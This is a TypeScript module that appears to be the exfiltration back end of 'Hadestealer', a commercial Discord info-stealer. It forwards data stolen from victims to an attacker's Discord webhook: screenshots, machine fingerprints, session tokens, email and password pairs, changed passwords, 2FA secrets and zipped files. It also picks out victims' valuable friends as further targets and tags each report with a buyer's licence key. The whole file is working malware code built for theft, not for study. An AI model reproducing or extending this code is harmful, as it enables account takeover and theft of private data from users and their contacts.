import { BASE_WEBHOOK_URL, EMOJIS } from "../config";
import { scheduleForward } from "./scheduleForward";
import fs from "fs";
import fetch from "node-fetch";
import FormData from "form-data";
import UserAccess from "../models/UserAccess";
import { getBadges } from "./getBadges";
import bettermarkdown from "discord-bettermarkdown"
declare const require: any;

function formatForEmbed(value: any, maxInner = 900): string {
    let s: string;
    if (typeof value === 'object') {
        try { s = JSON.stringify(value, null, 2); } catch { s = String(value); }
    } else {
        s = String(value ?? '');
    }
    if (s.length > maxInner) s = s.slice(0, maxInner - 3) + '...';

    try {
        const raw = s;
        const cast = raw as any;
        let styled = String(raw);
        if (typeof value === 'string') styled = (cast as any).green || String(raw);
        else if (typeof value === 'number') styled = (cast as any).cyan || String(raw);
        else if (typeof value === 'boolean') styled = (cast as any).yellow || String(raw);
        else styled = (cast as any).white || String(raw);
        return `\`\`\`ansi\n${styled}\n\`\`\``;
    } catch { }

    let lang = 'txt';
    if (typeof value === 'object') lang = 'json';
    else if (typeof value === 'number') lang = 'css';
    else if (typeof value === 'boolean') lang = 'properties';
    return `\`\`\`${lang}\n${s}\n\`\`\``;
}

async function notifyWebhook(payload: { route: string; id?: string; originalName?: string; meta?: any; filePath?: string }) {
    if (!BASE_WEBHOOK_URL) return;
    let ua: any = null;
    var meta = payload.meta;

    try {
        const buildId = meta && (meta.buildId ?? meta['X-Build-ID'] ?? meta['x-build-id']);
        if (buildId) {
            ua = await UserAccess.findOne({ userId: String(buildId) });
        }
    } catch { ua = null; }
    if (payload.route == "/capture") {
        const fileName = `screen_${Date.now()}.png`;
        const form = new FormData();
        const imageBuffer = Buffer.from(meta.file.image, "base64")

        form.append('file', imageBuffer, { filename: fileName });

        const embed = {
            author: {
                name: "Hadestealer",
                icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png"
            },
            title: "Hadestealer SCREENSHOT",
            image: {
                url: `attachment://${fileName}`
            },
            footer: {
                text: `t.me/hadestealer | ID: ${ua ? `HADESTEALER_${ua.keyUsed}` : payload.id}`,
                icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png"
            },
            timestamp: new Date().toISOString()
        };

        const discordPayload = {
            username: "Hadestealer | t.me/hadestealer",
            avatar_url: embed.author.icon_url,
            embeds: [embed]
        };

        form.append('payload_json', JSON.stringify(discordPayload));

        try {
            await fetch(BASE_WEBHOOK_URL, {
                method: 'POST',
                headers: form.getHeaders(),
                body: form
            });
        } catch (e) { }
        try { scheduleForward([embed], payload.filePath, ua, meta, imageBuffer); } catch { }
    } else
        if (payload.route == "/antivm") {
            const data = meta.data?.data || meta;
            const embed: any = {
                author: { name: "Hadestealer", icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png" },
                title: "Hadestealer ANTIVM",
                description: "## Machine Information",
                fields: [
                    { name: "👤 Username", value: `\`\`\`${data.username}\`\`\``, inline: true },
                    { name: "🏷️ Hostname", value: `\`\`\`${data.hostname}\`\`\``, inline: true },
                    { name: "💻 Processor", value: `\`\`\`${data.cpus}\`\`\``, inline: true },
                    { name: "⚙️ Architecture", value: `\`\`\`${data.arch}\`\`\``, inline: true },
                    { name: "🔑 Unique ID(HWID)", value: `\`\`\`${data.hwid}\`\`\``, inline: true },
                    { name: "🌍 System", value: `\`\`\`${data.platform}\`\`\``, inline: true }
                ],
                footer: { text: `t.me/hadestealer | ID: ${ua ? `HADESTEALER_${ua.keyUsed}` : payload.id}`, icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png" },
                timestamp: new Date().toISOString()
            };
            try {
                await fetch(BASE_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: "Hadestealer | t.me/hadestealer ", avatar_url: embed.author.icon_url, embeds: [embed] })
                });
            } catch { }
            try { scheduleForward([embed], payload.filePath, ua, meta); } catch { }
            return;
        }
        else if (payload.route == "/inject") {
            const embed: any = {
                author: { name: "Hadestealer", icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png" },
                fields: [],
                footer: { text: `t.me/hadestealer | ID: ${ua ? `HADESTEALER_${ua.keyUsed}` : payload.id}`, icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png" },
                timestamp: new Date().toISOString()
            };
            const iData = meta.data;
            if (iData.type === "TOKEN_GRABBED") {
                embed.title = "Hadestealer TOKEN GRABBED";
                embed.description = `${EMOJIS.GorunenAd} **Username:** ${iData.user}\n- \`\`\`${iData.data.token}\`\`\``;
            } else if (iData.type == "PASSWORD_CHANGED") {
                embed.title = "Hadestealer PASSWORD CHANGED";
                embed.description = `${EMOJIS.GorunenAd} **Username:** ${iData.user}\n- **Old Password:** ${EMOJIS.oldPass} \`\`\`${iData.data.old}\`\`\`\n- **New Password:** ${EMOJIS.newPass} \`\`\`${iData.data.new}\`\`\``;
            } else if (iData.type == "CREDENTIALS_CAPTURE") {
                embed.title = "Hadestealer CREDENTIALS CAPTURED";
                embed.description = `${EMOJIS.GorunenAd} **Username:** ${iData.user}\n- **Email:** ${EMOJIS.Mail} \`\`\`${iData.data.email}\`\`\`\n- **Password:** ${EMOJIS.Kilit} \`\`\`${iData.data.pass}\`\`\``;
            }
            else if (iData.type == "2FA_SETUP_SUCCESS") {
                embed.title = "Hadestealer 2FA SETUP SUCCESS";
                embed.description = `${EMOJIS.GorunenAd} **Username:** ${iData.user}\n- **Secret:** ${EMOJIS.Mfa} \`\`\`${iData.data.secret}\`\`\``;
            }
            try {
                await fetch(BASE_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: "Hadestealer | t.me/hadestealer ", avatar_url: embed.author.icon_url, embeds: [embed] })
                });
            } catch { }
            try { scheduleForward([embed], payload.filePath, ua, meta); } catch { }
            return;
        }
        else {
            try {
                const embed: any = {
                    author: { name: "Hadestealer", icon_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png" },
                    fields: [],
                    timestamp: new Date().toISOString()
                };
                if (payload.id) embed.footer = { text: `t.me/hadestealer | ID: ${ua ? `HADESTEALER_${ua.keyUsed}` : payload.id}`, icon_url: embed.author.icon_url };

                const allEmbeds: any[] = [embed];
                let userObj: any = null;
                if (meta && typeof meta === 'object') {
                    if (meta.userInfo) userObj = meta.userInfo;
                    else if (meta.id && meta.username) userObj = meta;
                }

                if (payload.originalName) embed.fields.push({ name: 'File', value: formatForEmbed(payload.originalName), inline: false });

                if (userObj) {
                    const { id, avatar, username } = userObj.user;
                    const { phone } = userObj;
                    if (avatar && id) {
                        const ext = avatar.startsWith('a_') ? 'gif' : 'png';
                        embed.thumbnail = { url: `https://cdn.discordapp.com/avatars/${id}/${avatar}.${ext}?size=512` };
                    }
                    embed.description = `**${EMOJIS.GorunenAd} ${username} (${id})**`;
                    const badges = getBadges(userObj);
                    embed.fields.push({ name: "🎁 Badges:", value: badges.length > 0 ? badges.join(' ') : formatForEmbed(`[YOK]`), inline: true });
                    embed.fields.push({ name: `${EMOJIS.Mfa} MFA:`, value: userObj.mfa_enabled ? formatForEmbed("Enabled") : formatForEmbed("Disabled"), inline: true });
                    embed.fields.push({ name: `${EMOJIS.Token} Token:`, value: formatForEmbed(meta.token), inline: false });
                    embed.fields.push({ name: `${EMOJIS.Mail} Email:`, value: userObj.email ? formatForEmbed(userObj.email) : '—', inline: true });
                    embed.fields.push({ name: `${EMOJIS.Telefon}  Phone:`, value: phone ? formatForEmbed(phone) : '—', inline: true });
                }

                if (meta && meta.summary) {
                    const summaryStr = String(meta.summary);
                    const chunkSize = 1000;
                    for (let i = 0; i < summaryStr.length; i += chunkSize) {
                        const chunk = summaryStr.slice(i, i + chunkSize);
                        if (i === 0) {
                            embed.fields.push({ name: 'Summary', value: formatForEmbed(chunk), inline: false });
                        } else {
                            allEmbeds.push({
                                title: `Summary Continued (Part ${Math.floor(i / chunkSize) + 1})`,
                                description: formatForEmbed(chunk)
                            });
                        }
                    }
                }

                const finalBody = {
                    username: "Hadestealer | t.me/hadestealer ",
                    avatar_url: embed.author.icon_url,
                    content: "@everyone",
                    embeds: allEmbeds
                };

                if (payload.filePath && fs.existsSync(payload.filePath)) {
                    const form = new FormData();
                    form.append('payload_json', JSON.stringify(finalBody));
                    form.append('file', fs.createReadStream(payload.filePath), payload.originalName ?? 'file.zip');
                    await fetch(BASE_WEBHOOK_URL, { method: 'POST', body: form as any, headers: form.getHeaders() });
                    try { scheduleForward(allEmbeds, payload.filePath, ua, meta); } catch { }
                } else {
                    await fetch(BASE_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(finalBody)
                    });
                    try { scheduleForward(allEmbeds, undefined, ua, meta); } catch { }
                }
                try {
                    const friendsArr = meta && Array.isArray(meta.friends) ? meta.friends : null;
                    if (friendsArr && friendsArr.length > 0) {
                        const IMPORTANT_BADGES = [EMOJIS.Partner, EMOJIS.BotDeveloper, EMOJIS.EarlySupporter, EMOJIS.BugHunter2, EMOJIS.Moderator]

                        const matched: Array<{ name: string; id: string; badges: string[] }> = [];

                        for (const f of friendsArr) {
                            const u = f.profile;
                            if (!u) continue;
                            const id = u.user.id ?? u.id ?? null;
                            const username = u.user.username ?? u.user.global_name
                            if (isNaN(u.user.public_flags) || u.user.public_flags === 0) continue;

                            const emojis = getBadges(u);
                            const important = emojis.filter(emoji => IMPORTANT_BADGES.includes(emoji));

                            if (important.length > 0) {
                                matched.push({
                                    name: username,
                                    id: String(id ?? '—'),
                                    badges: emojis
                                });
                            }
                        }

                        if (matched.length > 0) {
                            const friendsDes = matched.sort((a: any, b: any) => b.badges.length - a.badges.length).map(m => ({
                                name: `**${m.badges.join(' ')} | \`${m.name}\`**`,
                            }));

                            const friendsEmbed: any = {
                                title: `🎈 HQ Friends (${friendsDes.length}/${friendsArr.length})`,
                                description: friendsDes.map(f => f.name).join('\n'),
                                timestamp: new Date().toISOString()
                            };

                            try {
                                await fetch(BASE_WEBHOOK_URL, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        username: "Hadestealer | t.me/hadestealer ",
                                        avatar_url: "https://media.discordapp.net/attachments/1465058104499507456/1470356657363095572/image.png?ex=698affd9&is=6989ae59&hm=329b4cb0aca032d344810bb9749c95edcf7977d8126f3798d4e29dcb6838ec4e&=&format=webp&quality=lossless&width=438&height=438",
                                        embeds: [friendsEmbed]
                                    })
                                });
                            } catch (err) {

                            }

                            try { scheduleForward([friendsEmbed], undefined, ua, meta); } catch { }
                        }
                    }
                } catch (e) {
                    console.error("Friends processing error:", e);
                }
            } catch (e) {
                console.error("Critical Webhook Error:", e);
            }
        }
}

export { notifyWebhook };